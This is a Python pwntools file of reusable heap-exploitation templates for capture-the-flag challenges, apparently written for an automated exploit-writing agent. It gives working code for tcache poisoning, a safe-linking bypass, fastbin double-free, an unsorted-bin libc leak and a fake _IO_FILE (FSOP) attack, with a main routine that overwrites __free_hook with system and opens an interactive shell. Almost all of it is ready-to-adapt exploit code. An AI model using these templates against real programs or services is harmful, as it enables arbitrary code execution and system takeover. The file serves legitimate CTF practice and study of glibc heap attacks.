#!/usr/bin/env python3
"""
heap_attacks.py -- Reference templates for the four common heap attacks.

Copy the section you need into your challenge solve.py and fill in the
challenge-specific menu helpers (alloc/free/edit/show). Each template
includes the glibc version range it works on and the primitive it requires.

Sections:
  1. tcache_poison       glibc 2.26+ (no safe-linking yet, so 2.26-2.31)
  2. tcache_safe_link    glibc 2.32+ (PROTECT_PTR mangling)
  3. fastbin_dup         glibc <2.26 (or tcache full + fastbin still active)
  4. unsorted_bin_leak   any glibc (libc base leak via unsorted bin fd)
  5. fsop_io_str_jumps   glibc 2.34+ (FSOP via _IO_str_jumps)

Usage from a chain agent:
  - Read this file once
  - Identify which attack applies (decision_tree.py heap_selection)
  - Copy + adapt the matching section
  - Remember to set context.binary, libc = ELF('./libc.so.6'), etc.
    (see chain.md Libc Pinning Protocol)
"""
from pwn import *

# ---------------------------------------------------------------------------
# Boilerplate every heap solve.py needs
# ---------------------------------------------------------------------------

context.binary = elf = ELF("./chall")
libc = ELF("./libc.so.6")  # MANDATORY explicit load — see chain.md
ld = ELF("./ld-linux-x86-64.so.2", checksec=False)  # if provided
HOST, PORT = "1.2.3.4", 1337


def conn():
    if args.LOCAL:
        return process([ld.path, elf.path], env={"LD_PRELOAD": libc.path})
    return remote(HOST, PORT)


# Challenge-specific menu interface — fill these in
def alloc(idx, size, data=b"A"):
    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b"idx: ", str(idx).encode())
    io.sendlineafter(b"size: ", str(size).encode())
    io.sendafter(b"data: ", data)


def free(idx):
    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b"idx: ", str(idx).encode())


def show(idx):
    io.sendlineafter(b"> ", b"3")
    io.sendlineafter(b"idx: ", str(idx).encode())
    return io.recvline().strip()


def edit(idx, data):
    io.sendlineafter(b"> ", b"4")
    io.sendlineafter(b"idx: ", str(idx).encode())
    io.sendafter(b"data: ", data)


# ===========================================================================
# 1. tcache_poison  (glibc 2.26 - 2.31)
# ===========================================================================
# Primitive: UAF or double-free on a tcache-eligible chunk (size <= 0x408)
# Result:    arbitrary alloc to any address
def tcache_poison(target_addr, chunk_size=0x40):
    """
    Plant `target_addr` into a freed tcache chunk's fd.
    Two more allocs of the same size will return `target_addr`.
    """
    alloc(0, chunk_size, b"victim")
    alloc(1, chunk_size, b"guard")  # prevent consolidation
    free(0)
    edit(0, p64(target_addr))   # overwrite fd → target
    alloc(2, chunk_size, b"x")   # consumes original chunk
    alloc(3, chunk_size, b"\0" * 8)  # returns target_addr
    return 3  # idx whose write goes to target_addr


# ===========================================================================
# 2. tcache_safe_link  (glibc 2.32+)
# ===========================================================================
# Primitive: same as tcache_poison BUT need a heap leak (or alloc address)
# because fd is mangled with PROTECT_PTR(pos, ptr) = (pos >> 12) ^ ptr
def protect_ptr(pos, ptr):
    return (pos >> 12) ^ ptr


def reveal_ptr(pos, mangled):
    # symmetric: fd ^ (pos >> 12) = original ptr
    return mangled ^ (pos >> 12)


def tcache_safe_link(heap_base, target_addr, chunk_size=0x40):
    """
    safe-linking aware tcache poison. Need heap_base (or any chunk addr).
    `pos` is the address of the freed chunk's fd (= chunk_addr + 0x10).
    """
    alloc(0, chunk_size, b"victim")
    alloc(1, chunk_size, b"guard")
    free(0)

    # The fd field is at chunk0_data_addr (the address show(0) returns)
    pos = heap_base + 0x10  # adjust to where chunk 0's fd lives
    mangled = protect_ptr(pos, target_addr)
    edit(0, p64(mangled))

    alloc(2, chunk_size, b"x")
    alloc(3, chunk_size, b"\0" * 8)
    return 3


# ===========================================================================
# 3. fastbin_dup  (glibc < 2.26 OR tcache full)
# ===========================================================================
# Primitive: double-free on a fastbin-sized chunk (0x20-0x80 typically)
# Trick: free A, free B, free A again (B between A's prevents check)
def fastbin_dup_to_target(target_addr, chunk_size=0x60):
    """
    Classic fastbin dup → returns same chunk twice.
    target_addr should be a 'fake chunk' address whose size field matches.
    """
    alloc(0, chunk_size, b"A")
    alloc(1, chunk_size, b"B")
    free(0)
    free(1)
    free(0)  # double-free, bypassed by B between

    # Now allocate 3 chunks: 0,1,0_again
    alloc(2, chunk_size)
    alloc(3, chunk_size)
    alloc(4, chunk_size)  # same memory as chunk 2

    edit(2, p64(target_addr))
    alloc(5, chunk_size)
    alloc(6, chunk_size)  # → target_addr
    return 6


# ===========================================================================
# 4. unsorted_bin_leak  (any glibc)
# ===========================================================================
# Primitive: free a large chunk (> tcache max, > fastbin max) AND read it
# Result: leaked main_arena offset → libc base
def unsorted_bin_leak(read_size=0x500, leak_idx=0):
    """
    Allocate large chunk (> 0x410), prevent top consolidation, free, read fd.
    fd points into main_arena, ~0x60 from libc.symbols['main_arena_88'].
    """
    alloc(leak_idx, read_size, b"X")
    alloc(99, 0x10, b"guard")  # prevent merge with top chunk
    free(leak_idx)
    leaked = u64(show(leak_idx).ljust(8, b"\0"))
    # Calibrate offset by checking gdb_pwn heap output once on local
    libc_base = leaked - 0x21ace0  # adjust per glibc version!
    return libc_base


# ===========================================================================
# 5. fsop_io_str_jumps  (glibc 2.34+, after __free_hook removal)
# ===========================================================================
# When __free_hook / __malloc_hook are gone, FSOP via _IO_str_jumps is the
# go-to. Hijack stdout's _IO_FILE → fake _IO_str_jumps → _IO_str_overflow
# calls a function pointer with controlled arg.
def craft_fake_iofile(libc_base, system_addr, binsh_addr):
    """
    Returns a fake _IO_FILE_plus payload to overwrite stdout.
    Triggers on next puts/printf. Adjust offsets per glibc version.
    """
    fake = FileStructure()
    fake.flags = 0
    fake._IO_read_ptr = 0
    fake._IO_read_end = 0
    fake._IO_read_base = 0
    fake._IO_write_base = 0
    fake._IO_write_ptr = 1
    fake._IO_write_end = 0
    fake._IO_buf_base = binsh_addr
    fake._IO_buf_end = binsh_addr + 8
    # _IO_str_jumps - _IO_file_jumps differs by glibc; check with gdb:
    #   p &_IO_str_jumps - &_IO_file_jumps
    fake.vtable = libc_base + 0x2160c0  # _IO_str_jumps for glibc 2.34 (verify!)
    return bytes(fake)


# ---------------------------------------------------------------------------
# Pattern selection helper (run from chain agent at start)
# ---------------------------------------------------------------------------
def pick_attack(glibc_version: str, primitives: list[str]) -> str:
    """
    Decide which attack matches. primitives is a list like
    ['uaf', 'double_free', 'edit_after_free', 'show_after_free', 'large_free'].
    Returns one of the section names.
    """
    glibc = tuple(int(x) for x in glibc_version.split("."))
    if "double_free" in primitives:
        if glibc >= (2, 32):
            return "tcache_safe_link"
        if glibc >= (2, 26):
            return "tcache_poison"
        return "fastbin_dup"
    if "uaf" in primitives and "edit_after_free" in primitives:
        if glibc >= (2, 32):
            return "tcache_safe_link"
        return "tcache_poison"
    if "large_free" in primitives and "show_after_free" in primitives:
        return "unsorted_bin_leak"
    if glibc >= (2, 34):
        return "fsop_io_str_jumps"
    return "tcache_poison"  # safe default


if __name__ == "__main__":
    # Example flow — comment in / adapt as needed
    io = conn()
    libc_base = unsorted_bin_leak()
    system = libc_base + libc.symbols["system"]
    binsh = libc_base + next(libc.search(b"/bin/sh\x00"))
    target = libc.symbols["__free_hook"] + libc_base  # if available
    free_idx = tcache_poison(target)
    edit(free_idx, p64(system))
    edit(0, b"/bin/sh\x00")
    free(0)
    io.interactive()
